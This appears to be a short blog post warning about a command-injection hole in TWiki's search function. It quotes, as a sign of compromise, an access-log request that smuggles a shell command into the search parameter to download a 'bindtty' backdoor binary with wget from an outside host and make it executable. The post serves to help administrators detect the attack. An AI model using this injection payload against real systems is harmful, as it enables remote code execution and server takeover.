<h1>Security warning with TWiki</h1>

<a href="http://www.securitytracker.com/alerts/2004/Nov/1012223.html">TWiki Input Validation Hole in Search Function Lets Remote Users Execute Shell Commands</a> - This one got me at the OpenInteract wiki site. How do you know you've been bit? Check your access log for a GET URL like:
<pre class="smallSourceCode">
search/TWiki/?search=doesnotexist1%27%3B+%28wget+http%3A%2F%2Fblank.exitnic.net%2Fbindtty%3B+chmod+777+bindtty...
</pre>
<p>As long as your web server is running as an unprivileged user (like <tt>apache</tt>) you shouldn't be up the creek. It's still goddamned annoying these little bastards make simple things a chore...</p>
